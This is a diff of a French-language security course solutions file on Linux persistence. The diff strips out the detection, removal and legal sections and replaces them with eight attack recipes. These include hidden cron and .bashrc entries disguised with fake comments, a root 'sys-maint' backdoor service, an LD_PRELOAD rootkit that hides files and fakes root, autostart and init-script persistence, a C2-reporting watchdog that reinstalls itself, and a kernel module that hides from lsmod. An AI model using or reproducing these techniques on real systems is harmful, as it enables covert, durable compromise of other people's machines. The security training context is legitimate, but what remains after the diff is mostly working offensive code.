@@ -1,145 +1,273 @@
-═══════════════════════════════════════════════════════════════════════
-MODULE 33 : PERSISTENCE LINUX - SOLUTIONS
-═══════════════════════════════════════════════════════════════════════
+SOLUTIONS - MODULE 33 : LINUX PERSISTENCE
 
-AVERTISSEMENT : Solutions à titre éducatif uniquement.
+⚠️ AVERTISSEMENT : Architectures pour analyse défensive uniquement.
 
-═══════════════════════════════════════════════════════════════════════
-CONCEPTS CLÉS
-═══════════════════════════════════════════════════════════════════════
+SOLUTION 1 : CRON PERSISTENCE MULTI-TRIGGERS
 
-1. Cron Jobs :
-   - crontab -e pour éditer
-   - @reboot /path/to/script pour exécution au démarrage
-   - Format : minute heure jour mois jour_semaine commande
-   - Pas besoin de root pour cron utilisateur
+Multiples cron jobs :
+@reboot /tmp/.hidden
+0 * * * * /tmp/.hidden  # Toutes les heures
+@daily /tmp/.cleanup
+@weekly /tmp/.update
 
-2. Systemd Services :
-   - Fichiers .service dans /etc/systemd/system/
-   - systemctl enable pour activer au démarrage
-   - systemctl start pour démarrer immédiatement
-   - Nécessite root pour services système
-   - systemd --user pour services utilisateur
+Installation programmatique :
+(crontab -l 2>/dev/null; echo '@reboot /tmp/.hidden') | crontab -
 
-3. Shell RC Files :
-   - ~/.bashrc : exécuté pour shells interactifs
-   - ~/.profile : exécuté au login
-   - /etc/profile : global (nécessite root)
-   - Ajout en fin de fichier généralement
+Vérification :
+crontab -l | grep '.hidden'
 
-4. LD_PRELOAD :
-   - export LD_PRELOAD=/path/to/lib.so
-   - /etc/ld.so.preload pour persistence (root)
-   - Interception de fonctions système
-   - Technique de rootkit courante
+Backup si supprimé (watchdog) :
+if ! crontab -l | grep -q '.hidden'; then
+    (crontab -l; echo '@reboot /tmp/.hidden') | crontab -
+fi
 
-5. Init Scripts :
-   - /etc/rc.local (obsolète sur systemd)
-   - /etc/init.d/ (SysV init)
-   - Utiliser systemd sur systèmes modernes
 
-═══════════════════════════════════════════════════════════════════════
-EXEMPLES DE CODE
-═══════════════════════════════════════════════════════════════════════
+SOLUTION 2 : SYSTEMD SERVICE COMPLET
 
-Cron Job (programmatique) :
-```c
-system("(crontab -l 2>/dev/null; echo '@reboot /path/to/script') | crontab -");
-```
-
-Systemd Service :
-```bash
-cat > /etc/systemd/system/myapp.service << EOF
+/etc/systemd/system/sys-maint.service :
 [Unit]
-Description=My App
+Description=System Maintenance Service
+After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/myapp
+Type=forking
+ExecStart=/usr/local/bin/backdoor
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+User=root
 
 [Install]
 WantedBy=multi-user.target
-EOF
 
+Installation :
 systemctl daemon-reload
-systemctl enable myapp.service
-```
+systemctl enable sys-maint.service
+systemctl start sys-maint.service
 
-Bashrc Modification :
-```c
-FILE* f = fopen(getenv("HOME") "/.bashrc", "a");
-fprintf(f, "\n/path/to/script &\n");
-fclose(f);
-```
+User-level service (pas besoin root) :
+~/.config/systemd/user/my-service.service
+systemctl --user enable my-service.service
 
-LD_PRELOAD Library :
-```c
-// malicious.c
+
+SOLUTION 3 : BASHRC/PROFILE STEALTHY
+
+Ajout discret avec commentaire légitime :
+echo "" >> ~/.bashrc
+echo "# Update package cache" >> ~/.bashrc
+echo "/tmp/.update &>/dev/null &" >> ~/.bashrc
+
+Multiples fichiers :
+~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc
+
+Vérification éviter duplicata :
+if ! grep -q '/tmp/.update' ~/.bashrc; then
+    echo '/tmp/.update &' >> ~/.bashrc
+fi
+
+Global (nécessite root) :
+echo '/tmp/.global' >> /etc/profile
+
+
+SOLUTION 4 : LD_PRELOAD ROOTKIT
+
+hook.c :
+#define _GNU_SOURCE
+#include <dlfcn.h>
 #include <unistd.h>
+#include <dirent.h>
+#include <string.h>
 
+// Fake root UID
 uid_t getuid(void) {
-    return 0;  // Toujours root
+    return 0;
 }
 
-// Compilation:
-// gcc -shared -fPIC -o malicious.so malicious.c
-```
+uid_t geteuid(void) {
+    return 0;
+}
 
-═══════════════════════════════════════════════════════════════════════
-DÉTECTION
-═══════════════════════════════════════════════════════════════════════
+// Cacher fichiers/processus
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*original_readdir)(DIR*);
+    original_readdir = dlsym(RTLD_NEXT, "readdir");
 
-Commandes de détection :
-```bash
-# Cron jobs
-crontab -l
-ls -la /var/spool/cron/crontabs/
+    struct dirent *dir;
+    while ((dir = original_readdir(dirp)) != NULL) {
+        if (strstr(dir->d_name, ".hidden") == NULL) {
+            return dir;  // Cacher fichiers contenant .hidden
+        }
+    }
+    return NULL;
+}
 
-# Services systemd
-systemctl list-units --type=service
-systemctl list-unit-files --state=enabled
+// Intercepter fopen
+FILE *fopen(const char *path, const char *mode) {
+    FILE *(*original_fopen)(const char*, const char*);
+    original_fopen = dlsym(RTLD_NEXT, "fopen");
 
-# Shell RC files
-cat ~/.bashrc ~/.profile
+    if (strcmp(path, "/etc/passwd") == 0) {
+        return original_fopen("/tmp/fake_passwd", mode);
+    }
+    return original_fopen(path, mode);
+}
 
-# LD_PRELOAD
-cat /etc/ld.so.preload
-echo $LD_PRELOAD
+Compilation :
+gcc -shared -fPIC -o hook.so hook.c -ldl
 
-# Outils de scan
-chkrootkit
-rkhunter --check
-```
+Installation :
+echo '/path/to/hook.so' >> /etc/ld.so.preload
 
-═══════════════════════════════════════════════════════════════════════
-SUPPRESSION
-═══════════════════════════════════════════════════════════════════════
+Test :
+LD_PRELOAD=./hook.so id  # Devrait afficher uid=0
 
-Cron :
-  crontab -r  # Supprimer tous les cron jobs
-  crontab -e  # Éditer et supprimer ligne spécifique
 
-Systemd :
-  systemctl disable service.service
-  systemctl stop service.service
-  rm /etc/systemd/system/service.service
-  systemctl daemon-reload
+SOLUTION 5 : XDG AUTOSTART DESKTOP
 
-Bashrc :
-  # Éditer manuellement et supprimer ligne ajoutée
+~/.config/autostart/sys-update.desktop :
+[Desktop Entry]
+Type=Application
+Name=System Update Service
+Comment=Checks for system updates
+Exec=/tmp/.hidden
+Icon=system-software-update
+Terminal=false
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+X-KDE-autostart-after=panel
 
-LD_PRELOAD :
-  unset LD_PRELOAD
-  # Éditer /etc/ld.so.preload si nécessaire
+Installation programmatique :
+mkdir -p ~/.config/autostart
+cat > ~/.config/autostart/sys-update.desktop << EOF
+[Desktop Entry]
+Type=Application
+Exec=/tmp/.backdoor
+NoDisplay=true
+EOF
 
-═══════════════════════════════════════════════════════════════════════
-RAPPEL LÉGAL
-═══════════════════════════════════════════════════════════════════════
+Détection : ls ~/.config/autostart/
 
-Ces techniques ne doivent être utilisées que :
-- Sur vos propres systèmes
-- Dans des VM isolées pour apprentissage
-- Avec autorisation explicite
-- À des fins légitimes
 
-Toute utilisation malveillante est ILLÉGALE et peut entraîner des
-poursuites pénales.
+SOLUTION 6 : INIT SCRIPTS (LEGACY)
+
+/etc/rc.local (SysV legacy) :
+#!/bin/sh
+/tmp/.hidden &
+exit 0
+
+chmod +x /etc/rc.local
+
+/etc/init.d/malware :
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides: malware
+# Required-Start: $network
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+### END INIT INFO
+
+case "$1" in
+    start)
+        /usr/local/bin/backdoor &
+        ;;
+    stop)
+        killall backdoor
+        ;;
+esac
+
+Installation :
+chmod +x /etc/init.d/malware
+update-rc.d malware defaults
+
+
+SOLUTION 7 : MULTI-METHOD REDUNDANCY
+
+Watchdog thread :
+void *watchdog_thread(void *arg) {
+    while (1) {
+        // Vérifier cron
+        if (system("crontab -l | grep -q '.hidden'") != 0) {
+            system("(crontab -l; echo '@reboot /tmp/.hidden') | crontab -");
+            log_to_c2("Cron restored");
+        }
+
+        // Vérifier .bashrc
+        char bashrc[512];
+        snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", getenv("HOME"));
+        char cmd[1024];
+        snprintf(cmd, sizeof(cmd), "grep -q '.hidden' %s", bashrc);
+        if (system(cmd) != 0) {
+            FILE *f = fopen(bashrc, "a");
+            fprintf(f, "/tmp/.hidden &\n");
+            fclose(f);
+            log_to_c2(".bashrc restored");
+        }
+
+        // Vérifier systemd service
+        if (system("systemctl is-enabled sys-maint 2>/dev/null") != 0) {
+            install_systemd_service();
+            log_to_c2("systemd restored");
+        }
+
+        sleep(300 + rand() % 300);  // 5-10 minutes aléatoire
+    }
+}
+
+Installation multiple :
+install_cron();
+install_bashrc();
+install_systemd();
+install_xdg_autostart();
+install_ld_preload();
+pthread_create(&tid, NULL, watchdog_thread, NULL);
+
+
+SOLUTION 8 : KERNEL MODULE PERSISTENCE
+
+malicious.ko module :
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+MODULE_LICENSE("GPL");
+
+static int __init malicious_init(void) {
+    printk(KERN_INFO "Loading malicious module\n");
+
+    // Cacher module de lsmod
+    list_del(&__this_module.list);
+
+    // Hook syscalls, cacher fichiers/processus
+    // ...
+
+    return 0;
+}
+
+static void __exit malicious_exit(void) {
+    printk(KERN_INFO "Unloading malicious module\n");
+}
+
+module_init(malicious_init);
+module_exit(malicious_exit);
+
+Compilation :
+obj-m += malicious.o
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+Installation :
+insmod malicious.ko
+
+Persistence via /etc/modules-load.d/ :
+echo 'malicious' > /etc/modules-load.d/malicious.conf
+
+Détection difficile : lsmod ne montrera pas module caché
+
+
+RÉFÉRENCES :
+- MITRE ATT&CK Linux Persistence (T1053, T1543)
+- chkrootkit/rkhunter documentation
+- systemd.service man page
+- Linux rootkit techniques
+- LD_PRELOAD tricks (phrack)
